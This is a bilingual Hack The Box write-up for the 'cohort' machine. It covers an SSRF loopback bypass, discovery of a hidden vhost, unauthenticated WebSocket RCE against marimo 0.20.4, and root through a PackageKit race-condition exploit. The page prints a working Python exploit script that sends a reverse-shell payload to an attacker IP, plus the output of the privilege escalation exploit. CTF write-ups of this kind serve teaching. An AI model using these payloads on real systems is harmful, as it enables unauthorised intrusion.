@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>cohort | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">cohort</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ========== ENGLISH ========== -->
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p>The target machine exposed a web application on ports 80 and 443 that contained a <strong>Server-Side Request Forgery (SSRF)</strong> vulnerability. By probing the internal network through the SSRF, I discovered two internally-bound services: a Python API on port 5000 and a <strong>marimo</strong> notebook server on port 8888.</p>
+
+                    <p>Further enumeration via SSRF revealed a <code>/status</code> endpoint that disclosed the internal routing configuration, including a virtual hostname exposing the marimo interface externally. The marimo instance was running version 0.20.4, which is vulnerable to unauthenticated Remote Code Execution via WebSocket (<a href="https://github.com/advisories/GHSA-2679-6mx9-h9xc">GHSA-2679-6mx9-h9xc</a>). By connecting directly to the WebSocket terminal endpoint on the discovered vhost, I sent a reverse shell payload and gained initial access as the <code>marimo</code> user.</p>
+
+                    <p>Privilege escalation was achieved by exploiting <strong>CVE-2026-41651</strong> (Pack2TheRoot), a TOCTOU race condition in PackageKit that allows local privilege escalation. Using a public exploit, I obtained a SUID bash binary and escalated to <code>root</code>.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> SSRF for internal service discovery, marimo WebSocket RCE (GHSA-2679-6mx9-h9xc), PackageKit TOCTOU LPE (CVE-2026-41651 / Pack2TheRoot).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and running services:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">22</span>/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+<span style="color:#e06c75;">80</span>/tcp  open  http     nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://cohort.htb/
+<span style="color:#e06c75;">443</span>/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
+| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
+| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
+|_http-title: Did not follow redirect to https://cohort.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)</code></pre>
+
+                <p>The scan reveals SSH on port 22 and an nginx web server redirecting HTTP to HTTPS on <code>cohort.htb</code>. The SSL certificate also covers <code>*.cohort.htb</code>, which hints that subdomains may be in play.</p>
+
+                <h2>Web Enumeration & SSRF Discovery</h2>
+                <p>Browsing to <code>cohort.htb</code> presents a simple landing page. The only useful link leads to <code>portal.html</code>, which contains a URL-fetching feature — effectively a built-in SSRF vector:</p>
+
+                <p><img src="./media/image3.png" alt="Portal page showing the URL-fetch feature and its validation check descriptions, including that responses are returned to the user" /></p>
+
+                <p>The third point under "What validation checks" confirms that the server fetches the URL and returns the response content. This means we have a <strong>reflected SSRF</strong> — we can read the response of any URL the server can reach.</p>
+
+                <p>Testing reveals that obvious bypass targets like <code>localhost</code>, <code>127.0.0.1</code>, and the cloud metadata endpoint <code>169.254.169.254</code> (and its decimal equivalents) are blocked. However, the alternative loopback address <code>127.1</code> is <em>not</em> blocked, allowing access to internal services.</p>
+
+                <h2>Internal Port Discovery via SSRF</h2>
+                <p>Using <code>127.1</code> as the host and iterating over port numbers, I discover two internally listening services:</p>
+
+                <pre><code class="language-json"><span style="color:#98c379;">[200]</span> <span style="color:#e06c75;">:5000</span> {<span style="color:#61afef;">"ok"</span>: true, <span style="color:#61afef;">"fetched_status"</span>: 405, <span style="color:#61afef;">"content_type"</span>: <span style="color:#98c379;">"application/json"</span>, <span style="color:#61afef;">"preview"</span>: <span style="color:#98c379;">"{\"ok\": false, \"message\": \"Method not allowed.\"}"</span>, <span style="color:#61afef;">"message"</span>: <span style="color:#98c379;">"Source responded with an error status."</span>}
+
+<span style="color:#98c379;">[200]</span> <span style="color:#e06c75;">:8888</span> {<span style="color:#61afef;">"ok"</span>: true, <span style="color:#61afef;">"fetched_status"</span>: 200, <span style="color:#61afef;">"content_type"</span>: <span style="color:#98c379;">"text/html; charset=utf-8"</span>, <span style="color:#61afef;">"preview"</span>: <span style="color:#98c379;">"\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n&lt;meta charset=\"UTF-8\"&gt;..."</span>}</code></pre>
+
+                <p>Port 5000 returns a 405 (Method Not Allowed) on GET requests, so there is no easy way to interact with it. Port 8888, however, returns a full HTML page. Looking at the content previewed by the SSRF, I recognize the interface as <strong>marimo</strong> — an open-source reactive Python notebook framework: <a href="https://github.com/marimo-team/marimo">https://github.com/marimo-team/marimo</a>.</p>
+
+                <p>The HTML returned through the SSRF for port 8888 looks like this:</p>
+
+                <p><img src="./media/image1.png" alt="HTML source of the marimo interface as returned through the SSRF, showing the marimo notebook login/landing page structure" /></p>
+
+                <h2>Marimo Version Fingerprinting</h2>
+                <p>Since the SSRF supports arbitrary paths, I can probe API endpoints on the internal service. Querying <code>/api/version</code> on port 8888 reveals the exact marimo version:</p>
+
+                <pre><code class="language-json"><span style="color:#98c379;">[200]</span> <span style="color:#61afef;">/api/version</span>  {<span style="color:#61afef;">"ok"</span>: true, <span style="color:#61afef;">"fetched_status"</span>: 200, <span style="color:#61afef;">"content_type"</span>: <span style="color:#98c379;">"text/plain; charset=utf-8"</span>, <span style="color:#61afef;">"preview"</span>: <span style="color:#98c379;">"0.20.4"</span>, <span style="color:#61afef;">"message"</span>: <span style="color:#98c379;">"Source reachable."</span>}</code></pre>
+
+                <p>Marimo <strong>0.20.4</strong> is affected by a critical unauthenticated RCE vulnerability via its WebSocket terminal: <a href="https://github.com/advisories/GHSA-2679-6mx9-h9xc">GHSA-2679-6mx9-h9xc</a>. The vulnerability allows any client that can reach the <code>/terminal/ws</code> WebSocket endpoint to execute arbitrary commands in the context of the marimo process — no authentication required.</p>
+
+                <p>The catch: WebSocket connections use the <code>ws://</code> or <code>wss://</code> scheme, and the SSRF only accepts <code>http://</code> or <code>https://</code>:</p>
+
+                <p><img src="./media/image2.png" alt="SSRF error response showing that ws:// and wss:// protocol schemes are rejected, only http and https are allowed" /></p>
+
+                <p>So I cannot exploit the WebSocket vulnerability through the SSRF directly. I need to find a way to reach port 8888 from my own machine.</p>
+
+                <h2>Discovering the Internal Virtual Host via /status</h2>
+                <p>Continuing with web fuzzing of <code>cohort.htb</code>, I find the following endpoints:</p>
+
+                <pre><code class="language-plaintext">api                              (Status: <span style="color:#e5c07b;">301</span>) [--> https://cohort.htb/api/]
+api/experiments/configurations   (Status: <span style="color:#e06c75;">405</span>)
+api/experiments                  (Status: <span style="color:#e06c75;">405</span>)
+assets                           (Status: <span style="color:#e5c07b;">301</span>) [--> https://cohort.htb/assets/]
+portal.html                      (Status: <span style="color:#98c379;">200</span>)
+status                           (Status: <span style="color:#e06c75;">403</span>)</code></pre>
+
+                <p>The <code>/assets</code> and <code>/api</code> paths are either inaccessible or return nothing useful externally. However, <code>/status</code> returns a <strong>403 Forbidden</strong> when accessed directly — but when fetched <em>through the SSRF</em>, it responds with a revealing JSON payload:</p>
+
+                <pre><code class="language-json">{
+  <span style="color:#61afef;">"service"</span>: <span style="color:#98c379;">"cohort-edge"</span>,
+  <span style="color:#61afef;">"status"</span>: <span style="color:#98c379;">"ok"</span>,
+  <span style="color:#61afef;">"generated_by"</span>: <span style="color:#98c379;">"nginx"</span>,
+  <span style="color:#61afef;">"upstreams"</span>: [
+    {<span style="color:#61afef;">"name"</span>: <span style="color:#98c379;">"marketing"</span>, <span style="color:#61afef;">"host"</span>: <span style="color:#98c379;">"cohort.htb"</span>, <span style="color:#61afef;">"root"</span>: <span style="color:#98c379;">"/var/www/cohort"</span>},
+    {<span style="color:#61afef;">"name"</span>: <span style="color:#98c379;">"insights-api"</span>, <span style="color:#61afef;">"host"</span>: <span style="color:#98c379;">"cohort.htb"</span>, <span style="color:#61afef;">"path"</span>: <span style="color:#98c379;">"/api/"</span>, <span style="color:#61afef;">"target"</span>: <span style="color:#98c379;">"127.0.0.1:5000"</span>},
+    {<span style="color:#61afef;">"name"</span>: <span style="color:#98c379;">"notebooks"</span>, <span style="color:#61afef;">"host"</span>: <span style="color:#98c379;">"nb-1be3782a8afd3ad5.cohort.htb"</span>, <span style="color:#61afef;">"target"</span>: <span style="color:#98c379;">"127.0.0.1:8888"</span>, <span style="color:#61afef;">"note"</span>: <span style="color:#98c379;">"internal analyst workspace, not for external use"</span>}
+  ]
+}</code></pre>
+
+                <p>This is critical. The nginx routing configuration shows that the marimo service on port 8888 is proxied through the virtual host <code>nb-1be3782a8afd3ad5.cohort.htb</code>. Despite the "not for external use" note, adding this hostname to <code>/etc/hosts</code> makes it directly reachable from my machine — including over WebSockets.</p>
+
+                <h2>Initial Access — Marimo WebSocket RCE</h2>
+                <p>With <code>nb-1be3782a8afd3ad5.cohort.htb</code> added to my hosts file, I can now connect to the marimo WebSocket terminal endpoint directly. Based on the public PoC for GHSA-2679-6mx9-h9xc, I write the following exploit script:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">#!/usr/bin/env python3</span>
+
+<span style="color:#c678dd;">import</span> websocket
+<span style="color:#c678dd;">import</span> ssl
+<span style="color:#c678dd;">import</span> time
+
+<span style="color:#e5c07b;">MARIMO_URL</span> = <span style="color:#98c379;">"wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"</span>
+<span style="color:#e5c07b;">LHOST</span>      = <span style="color:#98c379;">"10.10.16.140"</span>
+<span style="color:#e5c07b;">LPORT</span>      = <span style="color:#98c379;">443</span>
+
+sslopt = {<span style="color:#98c379;">"cert_reqs"</span>: ssl.CERT_NONE, <span style="color:#98c379;">"check_hostname"</span>: <span style="color:#e06c75;">False</span>}
+
+ws = websocket.WebSocket(sslopt=sslopt)
+ws.connect(MARIMO_URL)
+<span style="color:#c678dd;">print</span>(<span style="color:#98c379;">"[+] Connected!"</span>)
+
+payload = (
+    <span style="color:#c678dd;">f</span><span style="color:#98c379;">"nohup python3 -c \"import socket,subprocess,os;"</span>
+    <span style="color:#c678dd;">f</span><span style="color:#98c379;">"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"</span>
+    <span style="color:#c678dd;">f</span><span style="color:#98c379;">"s.connect(('{LHOST}',{LPORT}));"</span>
+    <span style="color:#c678dd;">f</span><span style="color:#98c379;">"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"</span>
+    <span style="color:#c678dd;">f</span><span style="color:#98c379;">"subprocess.call(['/bin/sh','-i'])\" "</span>
+    <span style="color:#c678dd;">f</span><span style="color:#98c379;">"&gt; /dev/null 2&gt;&amp;1 &amp;"</span>
+)
+
+ws.send(payload + <span style="color:#98c379;">"\n"</span>)
+<span style="color:#c678dd;">print</span>(<span style="color:#c678dd;">f</span><span style="color:#98c379;">"[+] Reverse shell payload sent to {LHOST}:{LPORT}"</span>)
+
+time.sleep(<span style="color:#e5c07b;">3</span>)
+ws.close()</code></pre>
+
+                <p>The script connects directly to the <code>/terminal/ws</code> WebSocket endpoint and sends a reverse shell command. The <code>nohup ... &amp;</code> wrapper is essential here: without it, the shell dies immediately when the WebSocket connection closes. Running the process in the background with <code>nohup</code> keeps it alive.</p>
+
+                <p>With a netcat listener on port 443, I execute the script and receive a shell as the <code>marimo</code> user. After stabilizing the shell, I retrieve the user flag.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>Looking at running processes with <code>ps -fauxww</code>, I find the marimo server startup command, which leaks its authentication token:</p>
+
+                <pre><code class="language-plaintext">marimo  384246  4.8  2.3  1117264  96104  ?  Ssl  0:01  \_ /opt/marimo/venv/bin/python3 /opt/marimo/venv/bin/marimo edit \
+  /home/marimo/notebooks/retention.py \
+  --headless --host 127.0.0.1 -p 8888 \
+  --token --token-password <span style="color:#e5c07b;">YKQ6iPyO5kusNx0BpVAPfjP5</span> \
+  --skip-update-check --no-sandbox</code></pre>
+
+                <p>The token is interesting but ultimately not useful for privilege escalation — the marimo process is already running as the <code>marimo</code> user, the same account I have access to. Knowing the token gives no additional privilege.</p>
+
+                <p>I review other common escalation vectors (sudo rules, SUID binaries, cron jobs, writable paths) but find nothing immediately exploitable through standard checks.</p>
+
+                <h2>Privilege Escalation — CVE-2026-41651 (Pack2TheRoot)</h2>
+                <p>Before giving up on automated enumeration, I run the latest release of <a href="https://github.com/peass-ng/PEASS-ng/releases">linpeas</a> — it's worth running up-to-date versions as new CVEs get added regularly. It flags something interesting:</p>
+
+                <pre><code class="language-plaintext">╔══════════╣ Checking for PackageKit Pack2TheRoot (CVE-2026-41651) (T1068)
+╚ https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
+
+PackageKit version detected: <span style="color:#e5c07b;">1.2.8-2ubuntu1.2</span>
+
+<span style="color:#e06c75;">Vulnerable to CVE-2026-41651 (Pack2TheRoot)</span> - PackageKit 1.2.8-2ubuntu1.2 is below the Ubuntu 24.04 fixed version: 1.2.8-2ubuntu1.5
+
+══╣ PackageKit daemon reachability
+pkcon/pkmon present - daemon can be activated on demand via D-Bus</code></pre>
+
+                <p>CVE-2026-41651, nicknamed <strong>Pack2TheRoot</strong>, is a TOCTOU (Time-Of-Check Time-Of-Use) race condition in PackageKit's package installation flow. By sending two crafted <code>InstallFiles</code> transactions in quick succession — one to trick the authorization check and one carrying a malicious payload — an attacker can cause PackageKit (running as root) to install a package that drops a SUID binary on the filesystem, granting local privilege escalation without any sudo rights required.</p>
+
+                <p>A ready-to-use exploit binary is available at: <a href="https://github.com/Vozec/CVE-2026-41651">https://github.com/Vozec/CVE-2026-41651</a></p>
+
+                <p>I transfer the binary to the target and execute it:</p>
+
+                <pre><code class="language-plaintext">marimo@cohort:~$ ./cve-2026-41651
+
+═══════════════════════════════════════════════════
+CVE-2026-41651 — PackageKit TOCTOU LPE
+═══════════════════════════════════════════════════
+
+[*] Building packages (pure C)...
+[+] dummy   : /tmp/.pk-dummy-384307.deb
+[+] payload : /tmp/.pk-payload-384307.deb
+[*] Transaction : /2_aebaaeda
+[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
+[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
+[*] Waiting for dispatch (30 s max)...
+[!] PK error 48: Failed to obtain authentication.
+[*] Finished (exit=2, 0 ms)
+[*] Loop ran for 156 ms
+[*] Polling for payload (120 s max)...
+[*] t+1s: payload=exists dpkg_lock=free suid=not yet
+[*] t+2s: payload=exists dpkg_lock=free suid=not yet
+[*] t+3s: payload=exists dpkg_lock=free suid=not yet
+<span style="color:#98c379;">[+] SUCCESS — SUID bash at t+2700ms</span>
+
+uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
+
+.suid_bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+.suid_bash: no job control in this shell</code></pre>
+
+                <p>The exploit races the PackageKit authorization check by submitting both transactions asynchronously. Even though it logs a "Failed to obtain authentication" error for the simulated transaction, the race is won: the payload package gets installed with root privileges before the authorization is fully enforced, dropping a SUID-root <code>bash</code> binary. Running it with <code>.suid_bash -p</code> gives an effective UID of 0, and I retrieve the root flag.</p>
+            </div>
+
+            <!-- ========== ESPAÑOL ========== -->
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p>La máquina objetivo exponía una aplicación web en los puertos 80 y 443 que contenía una vulnerabilidad de <strong>Server-Side Request Forgery (SSRF)</strong>. Sondeando la red interna a través del SSRF, descubrí dos servicios escuchando internamente: una API Python en el puerto 5000 y un servidor de notebooks <strong>marimo</strong> en el puerto 8888.</p>
+
+                    <p>Una enumeración más profunda mediante SSRF reveló un endpoint <code>/status</code> que exponía la configuración de enrutamiento interno, incluyendo un virtual host que daba acceso externo a la interfaz de marimo. La instancia de marimo ejecutaba la versión 0.20.4, vulnerable a Ejecución Remota de Código sin autenticación mediante WebSocket (<a href="https://github.com/advisories/GHSA-2679-6mx9-h9xc">GHSA-2679-6mx9-h9xc</a>). Conectándome directamente al endpoint WebSocket del terminal en el vhost descubierto, envié un payload de reverse shell y obtuve acceso inicial como el usuario <code>marimo</code>.</p>
+
+                    <p>La escalada de privilegios se consiguió explotando <strong>CVE-2026-41651</strong> (Pack2TheRoot), una condición de carrera TOCTOU en PackageKit que permite escalada de privilegios local. Usando un exploit público, obtuve un binario bash con SUID y escalé a <code>root</code>.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> SSRF para descubrimiento de servicios internos, RCE mediante WebSocket de marimo (GHSA-2679-6mx9-h9xc), LPE TOCTOU de PackageKit (CVE-2026-41651 / Pack2TheRoot).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">22</span>/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+<span style="color:#e06c75;">80</span>/tcp  open  http     nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://cohort.htb/
+<span style="color:#e06c75;">443</span>/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
+| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
+| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
+|_http-title: Did not follow redirect to https://cohort.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)</code></pre>
+
+                <p>El escaneo revela SSH en el puerto 22 y un servidor nginx que redirige HTTP a HTTPS en <code>cohort.htb</code>. El certificado SSL también cubre <code>*.cohort.htb</code>, lo que sugiere que puede haber subdominios relevantes.</p>
+
+                <h2>Enumeración Web y Descubrimiento del SSRF</h2>
+                <p>Navegando a <code>cohort.htb</code> encuentro una página de inicio sencilla. El único enlace útil lleva a <code>portal.html</code>, que contiene una funcionalidad para obtener URLs — efectivamente un vector SSRF integrado:</p>
+
+                <p><img src="./media/image3.png" alt="Página portal mostrando la funcionalidad de fetch de URLs y las descripciones de las validaciones que se aplican, incluyendo que la respuesta se devuelve al usuario" /></p>
+
+                <p>El tercer punto bajo "What validation checks" confirma que el servidor obtiene la URL y devuelve el contenido de la respuesta. Esto implica que tenemos un <strong>SSRF con respuesta reflejada</strong> — podemos leer la respuesta de cualquier URL que el servidor pueda alcanzar.</p>
+
+                <p>Las pruebas revelan que objetivos obvios de bypass como <code>localhost</code>, <code>127.0.0.1</code> y el endpoint de metadatos cloud <code>169.254.169.254</code> (y sus equivalentes en decimal) están bloqueados. Sin embargo, la dirección de loopback alternativa <code>127.1</code> <em>no</em> está bloqueada, lo que permite acceder a servicios internos.</p>
+
+                <h2>Descubrimiento de Puertos Internos mediante SSRF</h2>
+                <p>Usando <code>127.1</code> como host e iterando sobre números de puerto, descubro dos servicios escuchando internamente:</p>
+
+                <pre><code class="language-json"><span style="color:#98c379;">[200]</span> <span style="color:#e06c75;">:5000</span> {<span style="color:#61afef;">"ok"</span>: true, <span style="color:#61afef;">"fetched_status"</span>: 405, <span style="color:#61afef;">"content_type"</span>: <span style="color:#98c379;">"application/json"</span>, <span style="color:#61afef;">"preview"</span>: <span style="color:#98c379;">"{\"ok\": false, \"message\": \"Method not allowed.\"}"</span>, <span style="color:#61afef;">"message"</span>: <span style="color:#98c379;">"Source responded with an error status."</span>}
+
+<span style="color:#98c379;">[200]</span> <span style="color:#e06c75;">:8888</span> {<span style="color:#61afef;">"ok"</span>: true, <span style="color:#61afef;">"fetched_status"</span>: 200, <span style="color:#61afef;">"content_type"</span>: <span style="color:#98c379;">"text/html; charset=utf-8"</span>, <span style="color:#61afef;">"preview"</span>: <span style="color:#98c379;">"\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n&lt;meta charset=\"UTF-8\"&gt;..."</span>}</code></pre>
+
+                <p>El puerto 5000 devuelve un 405 (Método no permitido) en peticiones GET, por lo que no hay manera sencilla de interactuar con él. El puerto 8888, en cambio, devuelve una página HTML completa. Observando el contenido que muestra el SSRF, reconozco la interfaz de <strong>marimo</strong> — un framework open-source de notebooks Python reactivos: <a href="https://github.com/marimo-team/marimo">https://github.com/marimo-team/marimo</a>.</p>
+
+                <p>El HTML devuelto a través del SSRF para el puerto 8888 tiene esta pinta:</p>
+
+                <p><img src="./media/image1.png" alt="Código fuente HTML de la interfaz de marimo tal como lo devuelve el SSRF, mostrando la estructura de la página de inicio/login del notebook de marimo" /></p>
+
+                <h2>Fingerprinting de la Versión de Marimo</h2>
+                <p>Dado que el SSRF soporta rutas arbitrarias, puedo sondear endpoints de la API del servicio interno. Consultando <code>/api/version</code> en el puerto 8888 obtengo la versión exacta de marimo:</p>
+
+                <pre><code class="language-json"><span style="color:#98c379;">[200]</span> <span style="color:#61afef;">/api/version</span>  {<span style="color:#61afef;">"ok"</span>: true, <span style="color:#61afef;">"fetched_status"</span>: 200, <span style="color:#61afef;">"content_type"</span>: <span style="color:#98c379;">"text/plain; charset=utf-8"</span>, <span style="color:#61afef;">"preview"</span>: <span style="color:#98c379;">"0.20.4"</span>, <span style="color:#61afef;">"message"</span>: <span style="color:#98c379;">"Source reachable."</span>}</code></pre>
+
+                <p>Marimo <strong>0.20.4</strong> está afectado por una vulnerabilidad crítica de RCE sin autenticación mediante su terminal WebSocket: <a href="https://github.com/advisories/GHSA-2679-6mx9-h9xc">GHSA-2679-6mx9-h9xc</a>. La vulnerabilidad permite que cualquier cliente que pueda alcanzar el endpoint WebSocket <code>/terminal/ws</code> ejecute comandos arbitrarios en el contexto del proceso marimo — sin necesidad de autenticación.</p>
+
+                <p>El problema es que las conexiones WebSocket usan el esquema <code>ws://</code> o <code>wss://</code>, y el SSRF solo acepta <code>http://</code> o <code>https://</code>:</p>
+
+                <p><img src="./media/image2.png" alt="Respuesta de error del SSRF mostrando que los esquemas de protocolo ws:// y wss:// son rechazados, solo se permiten http y https" /></p>
+
+                <p>Así que no puedo explotar la vulnerabilidad WebSocket directamente a través del SSRF. Necesito encontrar la manera de alcanzar el puerto 8888 desde mi propia máquina.</p>
+
+                <h2>Descubrimiento del Virtual Host Interno mediante /status</h2>
+                <p>Continuando con el fuzzing web de <code>cohort.htb</code>, encuentro los siguientes endpoints:</p>
+
+                <pre><code class="language-plaintext">api                              (Status: <span style="color:#e5c07b;">301</span>) [--> https://cohort.htb/api/]
+api/experiments/configurations   (Status: <span style="color:#e06c75;">405</span>)
+api/experiments                  (Status: <span style="color:#e06c75;">405</span>)
+assets                           (Status: <span style="color:#e5c07b;">301</span>) [--> https://cohort.htb/assets/]
+portal.html                      (Status: <span style="color:#98c379;">200</span>)
+status                           (Status: <span style="color:#e06c75;">403</span>)</code></pre>
+
+                <p>Las rutas <code>/assets</code> y <code>/api</code> son inaccesibles o no devuelven nada útil externamente. Sin embargo, <code>/status</code> devuelve un <strong>403 Forbidden</strong> al acceder directamente — pero cuando se obtiene <em>mediante el SSRF</em>, responde con un JSON muy revelador:</p>
+
+                <pre><code class="language-json">{
+  <span style="color:#61afef;">"service"</span>: <span style="color:#98c379;">"cohort-edge"</span>,
+  <span style="color:#61afef;">"status"</span>: <span style="color:#98c379;">"ok"</span>,
+  <span style="color:#61afef;">"generated_by"</span>: <span style="color:#98c379;">"nginx"</span>,
+  <span style="color:#61afef;">"upstreams"</span>: [
+    {<span style="color:#61afef;">"name"</span>: <span style="color:#98c379;">"marketing"</span>, <span style="color:#61afef;">"host"</span>: <span style="color:#98c379;">"cohort.htb"</span>, <span style="color:#61afef;">"root"</span>: <span style="color:#98c379;">"/var/www/cohort"</span>},
+    {<span style="color:#61afef;">"name"</span>: <span style="color:#98c379;">"insights-api"</span>, <span style="color:#61afef;">"host"</span>: <span style="color:#98c379;">"cohort.htb"</span>, <span style="color:#61afef;">"path"</span>: <span style="color:#98c379;">"/api/"</span>, <span style="color:#61afef;">"target"</span>: <span style="color:#98c379;">"127.0.0.1:5000"</span>},
+    {<span style="color:#61afef;">"name"</span>: <span style="color:#98c379;">"notebooks"</span>, <span style="color:#61afef;">"host"</span>: <span style="color:#98c379;">"nb-1be3782a8afd3ad5.cohort.htb"</span>, <span style="color:#61afef;">"target"</span>: <span style="color:#98c379;">"127.0.0.1:8888"</span>, <span style="color:#61afef;">"note"</span>: <span style="color:#98c379;">"internal analyst workspace, not for external use"</span>}
+  ]
+}</code></pre>
+
+                <p>Esto es crítico. La configuración de enrutamiento de nginx muestra que el servicio marimo en el puerto 8888 está proxificado a través del virtual host <code>nb-1be3782a8afd3ad5.cohort.htb</code>. A pesar de la nota de "internal analyst workspace, not for external use", añadir este hostname a <code>/etc/hosts</code> lo hace directamente accesible desde mi máquina — incluyendo mediante WebSockets.</p>
+
+                <h2>Acceso Inicial — RCE mediante WebSocket de Marimo</h2>
+                <p>Con <code>nb-1be3782a8afd3ad5.cohort.htb</code> añadido a mi fichero de hosts, ahora puedo conectarme directamente al endpoint del terminal WebSocket de marimo. Basándome en la PoC pública para GHSA-2679-6mx9-h9xc, escribo el siguiente script de exploit:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">#!/usr/bin/env python3</span>
+
+<span style="color:#c678dd;">import</span> websocket
+<span style="color:#c678dd;">import</span> ssl
+<span style="color:#c678dd;">import</span> time
+
+<span style="color:#e5c07b;">MARIMO_URL</span> = <span style="color:#98c379;">"wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"</span>
+<span style="color:#e5c07b;">LHOST</span>      = <span style="color:#98c379;">"10.10.16.140"</span>
+<span style="color:#e5c07b;">LPORT</span>      = <span style="color:#98c379;">443</span>
+
+sslopt = {<span style="color:#98c379;">"cert_reqs"</span>: ssl.CERT_NONE, <span style="color:#98c379;">"check_hostname"</span>: <span style="color:#e06c75;">False</span>}
+
+ws = websocket.WebSocket(sslopt=sslopt)
+ws.connect(MARIMO_URL)
+<span style="color:#c678dd;">print</span>(<span style="color:#98c379;">"[+] Connected!"</span>)
+
+payload = (
+    <span style="color:#c678dd;">f</span><span style="color:#98c379;">"nohup python3 -c \"import socket,subprocess,os;"</span>
+    <span style="color:#c678dd;">f</span><span style="color:#98c379;">"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"</span>
+    <span style="color:#c678dd;">f</span><span style="color:#98c379;">"s.connect(('{LHOST}',{LPORT}));"</span>
+    <span style="color:#c678dd;">f</span><span style="color:#98c379;">"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"</span>
+    <span style="color:#c678dd;">f</span><span style="color:#98c379;">"subprocess.call(['/bin/sh','-i'])\" "</span>
+    <span style="color:#c678dd;">f</span><span style="color:#98c379;">"&gt; /dev/null 2&gt;&amp;1 &amp;"</span>
+)
+
+ws.send(payload + <span style="color:#98c379;">"\n"</span>)
+<span style="color:#c678dd;">print</span>(<span style="color:#c678dd;">f</span><span style="color:#98c379;">"[+] Reverse shell payload sent to {LHOST}:{LPORT}"</span>)
+
+time.sleep(<span style="color:#e5c07b;">3</span>)
+ws.close()</code></pre>
+
+                <p>El script se conecta directamente al endpoint WebSocket <code>/terminal/ws</code> y envía un comando de reverse shell. El wrapper <code>nohup ... &amp;</code> es esencial aquí: sin él, la shell muere instantáneamente cuando se cierra la conexión WebSocket. Ejecutar el proceso en segundo plano con <code>nohup</code> lo mantiene vivo.</p>
+
+                <p>Con un listener de netcat en el puerto 443, ejecuto el script y recibo una shell como el usuario <code>marimo</code>. Tras estabilizar la shell, obtengo la flag de usuario.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Revisando los procesos en ejecución con <code>ps -fauxww</code>, encuentro el comando de arranque del servidor marimo, que filtra su token de autenticación:</p>
+
